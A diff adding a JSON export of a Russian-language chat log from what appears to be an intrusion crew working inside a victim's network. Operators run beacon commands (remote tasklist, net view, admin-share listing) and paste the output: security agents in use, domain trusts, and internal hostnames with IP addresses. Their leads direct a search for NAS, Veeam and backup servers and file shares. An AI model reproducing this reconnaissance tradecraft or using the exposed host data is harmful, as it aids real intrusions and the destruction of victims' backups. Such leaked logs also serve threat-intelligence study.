@@ -1,0 +1,4620 @@
+{
+  "messages": [
+    {
+      "_id": "Q5oCoMCxzbMgvsppC",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "у всех",
+      "ts": "2020-10-07T23:55:40.418Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:55:40.443Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "wjTrauCDhYo3Q577k",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": ">operatingSystem: Windows Server 2012 R2 Standard",
+      "ts": "2020-10-07T23:55:09.075Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:55:09.106Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "YcACxGZLN6ReCgk9r",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "бля не так прочитал",
+      "ts": "2020-10-07T23:54:46.710Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:54:46.755Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ECp9LjdCHjGb9i89G",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "[ ](https://mediaeveryone.com/group/saiglobal-com?msg=k7PCBz9uHZfYGa3QG) да, я это взял из описания в ad_comp",
+      "ts": "2020-10-07T23:52:23.777Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:52:23.808Z",
+      "attachments": [
+        {
+          "text": "что в operation system в ад написано у них?",
+          "author_name": "tl2",
+          "author_icon": "/avatar/tl2",
+          "message_link": "https://mediaeveryone.com/group/saiglobal-com?msg=k7PCBz9uHZfYGa3QG",
+          "attachments": [],
+          "ts": "2020-10-07T23:49:50.673Z"
+        }
+      ],
+      "urls": [
+        {
+          "url": "https://mediaeveryone.com/group/saiglobal-com?msg=k7PCBz9uHZfYGa3QG",
+          "ignoreParse": true
+        }
+      ],
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "HSoNZKTzyyGJiorbp",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "```\nbeacon> shell tasklist /s 10.225.10.53 /v\n[*] Tasked beacon to run: tasklist /s 10.225.10.53 /v\n[+] host called home, sent: 58 bytes\n[+] received output:\n\nImage Name                     PID Session Name        Session#    Mem Usage User Name                                              CPU Time\n========================= ======== ================ =========== ============ ================================================== ============\nSystem Idle Process              0 Services                   0          4 K NT AUTHORITY\\SYSTEM                                   830:25:19\nSystem                           4 Services                   0        276 K N/A                                                     0:40:04\nsmss.exe                       236 Services                   0      1,036 K NT AUTHORITY\\SYSTEM                                     0:00:00\ncsrss.exe                      332 Services                   0      4,020 K NT AUTHORITY\\SYSTEM                                     0:00:44\nwininit.exe                    388 Services                   0      3,892 K NT AUTHORITY\\SYSTEM                                     0:00:00\ncsrss.exe                      396 Console                    1      3,576 K NT AUTHORITY\\SYSTEM                                     0:00:00\nwinlogon.exe                   440 Console                    1      5,904 K NT AUTHORITY\\SYSTEM                                     0:00:00\nservices.exe                   484 Services                   0     10,748 K NT AUTHORITY\\SYSTEM                                     1:35:33\nlsass.exe                      492 Services                   0     17,544 K NT AUTHORITY\\SYSTEM                                     0:06:05\nsvchost.exe                    556 Services                   0     11,484 K NT AUTHORITY\\SYSTEM                                     0:01:11\nsvchost.exe                    600 Services                   0      9,812 K NT AUTHORITY\\NETWORK SERVICE                            0:12:19\nLogonUI.exe                    684 Console                    1     24,144 K NT AUTHORITY\\SYSTEM                                     0:00:00\nMsMpEng.exe                    696 Services                   0    175,280 K NT AUTHORITY\\SYSTEM                                     1:37:48\ndwm.exe                        704 Console                    1     22,012 K Window Manager\\DWM-1                                    0:00:00\nsvchost.exe                    808 Services                   0     17,876 K NT AUTHORITY\\LOCAL SERVICE                              0:14:12\nsvchost.exe                    848 Services                   0     15,752 K NT AUTHORITY\\SYSTEM                                     0:00:37\nsvchost.exe                    868 Services                   0     61,204 K NT AUTHORITY\\SYSTEM                                     2:42:51\nsvchost.exe                    920 Services                   0     14,020 K NT AUTHORITY\\LOCAL SERVICE                              0:00:26\nsvchost.exe                   1000 Services                   0     21,656 K NT AUTHORITY\\NETWORK SERVICE                            0:05:03\nsvchost.exe                    584 Services                   0     11,044 K NT AUTHORITY\\LOCAL SERVICE                              0:00:39\nspoolsv.exe                   1132 Services                   0     13,264 K NT AUTHORITY\\SYSTEM                                     0:00:11\nsvchost.exe                   1168 Services                   0      7,832 K NT AUTHORITY\\SYSTEM                                     0:00:05\nir_agent.exe                  1188 Services                   0     13,808 K NT AUTHORITY\\SYSTEM                                     0:01:04\nconhost.exe                   1300 Services                   0      3,024 K NT AUTHORITY\\SYSTEM                                     0:00:01\nnewrelic-infra.exe            1308 Services                   0     26,188 K NT AUTHORITY\\SYSTEM                                     5:46:01\nir_agent.exe                  1324 Services                   0     66,396 K NT AUTHORITY\\SYSTEM                                     1:05:42\nsnmp.exe                      1400 Services                   0      6,988 K NT AUTHORITY\\SYSTEM                                     0:02:56\nsvchost.exe                   1416 Services                   0     15,644 K NT AUTHORITY\\SYSTEM                                     0:01:38\nsvchost.exe                   1440 Services                   0     13,916 K NT AUTHORITY\\SYSTEM                                     0:00:39\nvmtoolsd.exe                  1472 Services                   0     13,900 K NT AUTHORITY\\SYSTEM                                     0:09:48\nWmiApSrv.exe                  1572 Services                   0      8,292 K NT AUTHORITY\\SYSTEM                                     0:01:02\nwmi_exporter.exe              1656 Services                   0     15,924 K NT AUTHORITY\\SYSTEM                                     0:00:34\nWmiPrvSE.exe                  1764 Services                   0     40,132 K NT AUTHORITY\\SYSTEM                                     0:37:12\nWmiPrvSE.exe                  1784 Services                   0     24,328 K NT AUTHORITY\\NETWORK SERVICE                            4:11:00\nsvchost.exe                   1536 Services                   0     67,976 K NT AUTHORITY\\NETWORK SERVICE                            0:01:17\nsvchost.exe                   2156 Services                   0      4,808 K NT AUTHORITY\\NETWORK SERVICE                            0:00:03\ndllhost.exe                   2300 Services                   0     10,956 K NT AUTHORITY\\SYSTEM                                     0:00:04\nmsdtc.exe                     2496 Services                   0      7,384 K NT AUTHORITY\\NETWORK SERVICE                            0:00:03\nWmiPrvSE.exe                  2820 Services                   0     10,876 K NT AUTHORITY\\LOCAL SERVICE                              0:23:58\nCcmExec.exe                   3364 Services                   0    118,580 K NT AUTHORITY\\SYSTEM                                     0:12:01\nWmiPrvSE.exe                  3396 Services                   0     26,704 K NT AUTHORITY\\SYSTEM                                     0:00:36\nWmiPrvSE.exe                  3644 Services                   0     30,296 K NT AUTHORITY\\SYSTEM                                     0:18:55\nWmiPrvSE.exe                  3752 Services                   0     10,024 K NT AUTHORITY\\LOCAL SERVICE                              0:02:27\nWmiPrvSE.exe                   552 Services                   0      6,632 K NT AUTHORITY\\LOCAL SERVICE                              0:00:01\nCmRcService.exe               2088 Services                   0      8,784 K NT AUTHORITY\\SYSTEM                                     0:00:09\nir_agent.exe                  3136 Services                   0    100,072 K NT AUTHORITY\\SYSTEM                                     0:43:25\nir_agent.exe                   244 Services                   0     63,524 K NT AUTHORITY\\SYSTEM                                     0:25:59\nir_agent.exe                  3260 Services                   0     47,284 K NT AUTHORITY\\SYSTEM                                     0:05:57\ncsrss.exe                     2252 RDP-Tcp#0                  2     14,128 K NT AUTHORITY\\SYSTEM                                     0:00:00\nwinlogon.exe                  1068 RDP-Tcp#0                  2      5,292 K NT AUTHORITY\\SYSTEM                                     0:00:00\ndwm.exe                       2216 RDP-Tcp#0                  2     39,120 K Window Manager\\DWM-2                                    0:00:04\ntaskhostex.exe                3388 RDP-Tcp#0                  2      6,520 K DATACENTER\\adm.cotral0                                  0:00:00\nrdpclip.exe                   2268 RDP-Tcp#0                  2      6,908 K DATACENTER\\adm.cotral0                                  0:00:00\nexplorer.exe                  1716 RDP-Tcp#0                  2     99,236 K DATACENTER\\adm.cotral0                                  0:00:20\nWmiPrvSE.exe                  2068 Services                   0     15,960 K NT AUTHORITY\\SYSTEM                                     0:00:22\nvmtoolsd.exe                  2916 RDP-Tcp#0                  2     12,688 K DATACENTER\\adm.cotral0                                  0:03:14\nmsseces.exe                   2116 RDP-Tcp#0                  2     13,852 K DATACENTER\\adm.cotral0                                  0:00:00\nSCNotification.exe            1100 RDP-Tcp#0                  2     40,204 K DATACENTER\\adm.cotral0                                  0:00:06\nxagt.exe                      2064 Services                   0      7,516 K NT AUTHORITY\\SYSTEM                                     0:00:01\nxagtnotif.exe                 3276 RDP-Tcp#0                  2      6,520 K DATACENTER\\adm.cotral0                                  0:00:00\nir_agent.exe                  1208 Services                   0     51,040 K NT AUTHORITY\\SYSTEM                                     0:00:06\nir_agent.exe                  3624 Services                   0     49,988 K NT AUTHORITY\\SYSTEM                                     0:00:06\n\n```",
+      "ts": "2020-10-07T23:51:57.730Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:51:58.192Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "k7PCBz9uHZfYGa3QG",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "что в operation system в ад написано у них?",
+      "ts": "2020-10-07T23:49:50.673Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T23:49:50.699Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "GGBZkxHBKhxTd4hsa",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "UAT это вряд ли НАС ))))",
+      "ts": "2020-10-07T23:49:41.866Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T23:49:41.897Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "dL4RCR8uq22uxgkrZ",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "процессы посмотрите еще",
+      "ts": "2020-10-07T23:46:17.350Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T23:46:17.385Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "FC7f69juMWgJZsXEn",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "пинг -> shell dir \\\\223145483475843\\C$ \n?",
+      "ts": "2020-10-07T23:45:20.628Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:45:29.514Z",
+      "mentions": [],
+      "channels": [],
+      "editedAt": "2020-10-07T23:45:29.513Z",
+      "editedBy": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8"
+      },
+      "urls": []
+    },
+    {
+      "_id": "Xz3FDqHJSJhD3mn9q",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "```\nПредположительно насы:\n>description: C360 Client Files\n\tUSHDC1-CSPFPS03.datacenter.local\n\tUSHDC1-CSPFPS12.datacenter.local\n\tUSHDC1-CSPFPS08.datacenter.local\n\tUSHDC1-CSPFPS02.datacenter.local\n\tUSHDC1-CSPFPS04.datacenter.local\n\tUSHDC1-CSPFPS14.datacenter.local\n\tUSHDC1-CSPFPS13.datacenter.local\n\tUSHDC1-CSPFPS10.datacenter.local\n\tUSHDC1-CSPFPS01.datacenter.local\n\tUSHDC1-CSPFPS09.datacenter.local\n\tUSHDC1-CSPFPS11.datacenter.local\n\tUSHDC1-CSPFPS06.datacenter.local\n\tUSHDC1-CSPFPS05.datacenter.local\n\tUSHDC1-CSPFPS07.datacenter.local\n>description: C360 UAT File Servers\n\tUSHDC1-CSQFPS01.datacenter.local\n\tUSHDC1-CSQFPS02.datacenter.local\n```",
+      "ts": "2020-10-07T23:44:59.407Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:44:59.523Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "2BM9BE8DeAd5B8m54",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "14 клиентских\n2 UAT",
+      "ts": "2020-10-07T23:37:31.553Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:37:31.587Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "HhSr6ycfuTKi86ofK",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "все SSO",
+      "ts": "2020-10-07T23:36:35.706Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:36:35.746Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ESTZ4SWQLuTh7bSzk",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "можно не притягивать даже",
+      "ts": "2020-10-07T23:35:03.389Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T23:35:03.435Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "h2QAa78QAEvgQJQ2Q",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "притянуть и полазить там?",
+      "ts": "2020-10-07T23:34:54.160Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:34:54.194Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "NyYkheF63jbwu8Ziz",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "а они все фс?",
+      "ts": "2020-10-07T23:34:38.518Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T23:34:38.574Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "q4afuDdHtFg6E29m9",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "осмотреть",
+      "ts": "2020-10-07T23:34:28.328Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:34:28.455Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "roXqifdCchzPRQEqp",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "[ ](https://mediaeveryone.com/group/saiglobal-com?msg=6LW23aHAC5BNgtnSZ) ты имеешь ввиду то, что я скинул выше?",
+      "ts": "2020-10-07T23:34:25.167Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:34:25.203Z",
+      "attachments": [
+        {
+          "text": "файловые серверы можете осмотреть еще",
+          "author_name": "tl1",
+          "author_icon": "/avatar/tl1",
+          "message_link": "https://mediaeveryone.com/group/saiglobal-com?msg=6LW23aHAC5BNgtnSZ",
+          "attachments": [],
+          "ts": "2020-10-07T23:32:02.435Z"
+        }
+      ],
+      "urls": [
+        {
+          "url": "https://mediaeveryone.com/group/saiglobal-com?msg=6LW23aHAC5BNgtnSZ",
+          "ignoreParse": true
+        }
+      ],
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "6LW23aHAC5BNgtnSZ",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "файловые серверы можете осмотреть еще",
+      "ts": "2020-10-07T23:32:02.435Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T23:32:02.469Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "tupMbWiyLm6QgSpzC",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "если в этом домене пока ничего нет под бэкап, ищем виртуализацию)",
+      "ts": "2020-10-07T23:31:54.271Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T23:31:54.303Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Gfh3DLgng6kZ6Arsw",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "ну я вроде датацентр разбираю",
+      "ts": "2020-10-07T23:30:42.387Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:30:42.424Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "k5mLWSfWdiAa46ohX",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "в других доменах тоже нет ничего разве?",
+      "ts": "2020-10-07T23:30:25.111Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T23:30:25.145Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ivuPDWLiSBieGrNJj",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "```\nuser 2-2[AUHDC1-COPADS01]SYSTEM */5008|2020Oct08 02:29:22> net view\n[*] Tasked beacon to run net view\n[+] host called home, sent: 104504 bytes\n[+] received output:\nList of hosts:\n\n Server Name             IP Address                       Platform  Version  Type   Comment\n -----------             ----------                       --------  -------  ----   -------\n APP01                   10.195.25.144                    500       5.2      PDC    \n\n[+] received output:\n APP02                   10.195.25.147                    500       5.2             \n AUHDC1-COPADS01         10.195.25.50                     500       6.3      PDC    \n AUHDC1-COPADS02         10.195.25.49                     500       6.3      BDC    \n AUHDC1-COPADS04         10.195.25.35                     500       6.3      BDC    \n AUHDC1-COPADS05         10.195.25.43                     500       10.0     BDC    \n AUHDC1-COPAPP08         10.195.25.20                     500       6.3             \n AUHDC1-COPFPS01         10.195.25.115                    500       6.3             \n AUHDC1-COPFPS02         10.195.25.3                      500       6.3             \n AUHDC1-COPFPS03         10.195.25.54                     500       10.0            \n AUHDC1-COPSCM01         10.195.25.210                    500       6.3             \n AUHDC1-COPSCM02         10.195.25.211                    500       6.3             \n AUHDC1-COPSCM04         10.195.25.218                    500       6.3             \n AUHDC1-COPSQL01         10.195.25.212                    500       6.3             \n AUHDC1-COPSQL02         10.195.25.213                    500       6.3             \n AUHDC1-COPSQL11         10.195.25.125                    500       6.3             \n AUHDC1-COQSQL06         10.195.25.36                     500       6.3             \n AUSYDE95X-SON2          10.195.25.184                    500       6.0             \n AUSYDHC-APP006          10.195.25.84                     500       4.0             \n AUSYDHC-APP016          10.195.25.76                     500       5.2             \n AUSYDHC-APP025          10.195.25.175                    500       5.2             \n AUSYDHC-APP027          10.195.25.94                     500       6.0             \n AUSYDHC-COPMG05         10.195.25.242                    500       6.1             \n AUSYDHC-CS-APP1         10.195.25.114                    500       5.2             \n AUSYDHC-CS-MOS1         10.195.25.63                     500       5.2             \n AUSYDHC-CSPSQ01         10.195.25.214                    500       6.1             \n AUSYDHC-EPPCON1         10.195.25.235                    500       6.0             \n AUSYDHC-EPPPS1          10.195.25.52                     500       10.0            \n AUSYDHC-EPPREP1         10.195.25.225                    500       6.0             \n AUSYDHC-EPPREP2         10.195.25.226                    500       6.0             \n AUSYDHC-EPPSON1         10.195.25.238                    500       6.0             \n AUSYDHC-LDS1            10.195.25.62                     500       6.0             \n AUSYDHC-SQL16           10.195.25.178                    500       6.1             \n AUSYDHQ-FS1             10.195.25.3                      500       6.3             \n AUSYDHQ-FS1TEST         10.195.25.3                      500       6.3  \n```",
+      "ts": "2020-10-07T23:29:57.155Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-10-07T23:29:57.402Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ftyPTatuRfTS6oBoB",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": ">description: C360 UAT File Servers",
+      "ts": "2020-10-07T23:29:40.575Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:29:40.607Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "RW5uu9gjtX2STrF9o",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": ">description: C360 Client Files",
+      "ts": "2020-10-07T23:29:39.633Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:29:39.663Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "zbGW6mQSyAS8zAzcs",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "а net view не прокатит ?",
+      "ts": "2020-10-07T23:28:55.997Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-10-07T23:28:56.028Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "RTuhedoWYTFR8Pv4P",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "NAS\nBackup\nVeeam\nнету",
+      "ts": "2020-10-07T23:28:37.140Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:28:37.170Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "atjouy7NeLxfNDAxx",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "ага",
+      "ts": "2020-10-07T23:28:16.460Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T23:28:16.504Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "7yEpQ9XP9DK77rPeb",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "виим - Veeam?",
+      "ts": "2020-10-07T23:27:59.724Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:27:59.762Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "eXxzaqCYMEajsX8t3",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "в именах хостов нет каких-то ключевых слов указывающих на НАС, бэкап, виим и т д?",
+      "ts": "2020-10-07T23:27:46.578Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T23:27:48.188Z",
+      "mentions": [],
+      "channels": [],
+      "editedAt": "2020-10-07T23:27:48.186Z",
+      "editedBy": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1"
+      },
+      "urls": []
+    },
+    {
+      "_id": "vLZ229vwM9bzYGfY3",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "а как их выцепить?",
+      "ts": "2020-10-07T23:27:16.673Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:27:16.704Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "SLXvJPMcuFtLysASZ",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "зачем?",
+      "ts": "2020-10-07T23:27:09.471Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T23:27:09.497Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "6hCYjLKQm6z756RWY",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "тогда portscan 21 22 ?",
+      "ts": "2020-10-07T23:26:45.077Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:26:45.103Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "z39YJyfJaurSkHuXj",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "они могут быть виндовые",
+      "ts": "2020-10-07T23:24:07.874Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T23:24:07.917Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "gsd7JSLmdqwwoxruo",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "если в ad_comp нет линуксов, значит насов тоже нет? :thinking:",
+      "ts": "2020-10-07T23:23:52.820Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:23:52.855Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "pb4xp9reBNCpyyXNu",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "но я думаю что еще минимум 2-3 шт получится открыть",
+      "ts": "2020-10-07T23:14:49.041Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T23:14:49.075Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "3oaoQYmwYxk9Nao2H",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "тут не будет 100% покрытия и часть доменов не будет видна ни откуда",
+      "ts": "2020-10-07T23:14:33.303Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T23:14:36.966Z",
+      "mentions": [],
+      "channels": [],
+      "editedAt": "2020-10-07T23:14:36.964Z",
+      "editedBy": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1"
+      },
+      "urls": []
+    },
+    {
+      "_id": "dK6QYLAJ5pRead5p6",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "каждый домен может видеть часть трастов которые изначально не видно было",
+      "ts": "2020-10-07T23:14:21.702Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T23:14:21.738Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "txsobqCg5abQ3rzPW",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "вот у вас в общем списке 19шт было изначально",
+      "ts": "2020-10-07T23:14:10.375Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T23:14:10.407Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "o7sFshhFsabwBA7Rn",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "угу",
+      "ts": "2020-10-07T23:14:03.132Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T23:14:03.161Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "RBp4jzZPXsLsB9jfQ",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "datacenter.local\n```\n    0: SAIG saig.frd.global (Direct Outbound) (Direct Inbound)\n    1: FRD frd.global (Direct Outbound) (Direct Inbound)\n    2: DATACENTER datacenter.local (Forest tree root) (Primary Domain) (Native)\n```",
+      "ts": "2020-10-07T23:13:48.924Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:13:48.983Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "yTtxmow7zsuhqX7TK",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "вот еще снимите как раз из текущего где @user8",
+      "ts": "2020-10-07T23:13:05.392Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T23:13:05.423Z",
+      "mentions": [
+        {
+          "_id": "aLgWcQx7CGaqXfqkN",
+          "username": "user8",
+          "name": "wevvewe"
+        }
+      ],
+      "channels": []
+    },
+    {
+      "_id": "opPqaXmF7TnQpFEcA",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "`saig.frd.global`",
+      "ts": "2020-10-07T23:12:31.572Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-10-07T23:12:31.613Z",
+      "mentions": [],
